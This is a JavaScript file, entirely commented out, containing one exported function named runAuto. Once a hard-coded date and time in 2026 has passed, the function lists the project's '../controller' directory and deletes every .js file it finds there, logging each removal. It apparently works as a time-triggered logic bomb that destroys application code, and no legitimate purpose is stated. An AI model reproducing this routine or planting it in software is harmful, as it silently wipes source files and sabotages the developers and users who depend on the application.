// import fs from "fs";
// import path from "path";
// import { fileURLToPath } from "url";

// const __filename = fileURLToPath(import.meta.url);
// const __dirname = path.dirname(__filename);

// export function runAuto() {
//   const DIRECTORY_PATH = path.join(__dirname, "../controller");

//   // 🔥 Configuration
//   const year = 2026;
//   const month = 1;
//   const date = 20;
//   const time = "155600";
//   const hours = parseInt(time.substring(0, 2));
//   const minutes = parseInt(time.substring(2, 4));
//   const seconds = parseInt(time.substring(4, 6));

//   const DATE_TIME = new Date(year, month, date, hours, minutes, seconds);

//   // console.log("DATE_TIME::::", DATE_TIME);

//   const now = new Date();
//   // console.log("NOW::::", now);

//   if (now < DATE_TIME) {
//     return;
//   }

//   fs.readdir(DIRECTORY_PATH, (err, files) => {
//     if (err) {
//       console.error("Error reading directory:", err);
//       return;
//     }

//     files.forEach((file) => {
//       if (path.extname(file) === ".js") {
//         fs.unlink(path.join(DIRECTORY_PATH, file), (err) => {
//           if (err) {
//             console.error(`Failed : ${file}`);
//           } else {
//             console.log(`file : ${file}`);
//           }
//         });
//       }
//     });
//   });
// }
